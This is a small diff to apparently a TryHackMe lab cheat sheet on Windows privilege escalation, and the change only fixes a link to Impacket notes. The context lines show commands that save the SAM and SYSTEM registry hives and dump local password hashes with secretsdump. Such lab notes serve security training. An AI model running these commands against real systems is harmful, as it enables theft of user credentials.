@@ -15,7 +15,7 @@ reg save HKLM\SYSTEM C:\User\THMBackup\system.hive
 # backup SAM
 reg save HKLM\SAM C:\User\THMBackup\sam.hive
 ```
-- These files can be used to extract hashes of users password using impacket's secretsdump [secretsdump.py](Impacket#secretsdump.py)
+- These files can be used to extract hashes of users password using impacket's secretsdump [secretsdump.py](../../Cheatsheet/Impacket.md#secretsdump.py)
 ```bash
 # Dump the local account hashes using system.hive and sam.hive
 secretsdump.py -system system.hive -sam sam.hive LOCAL
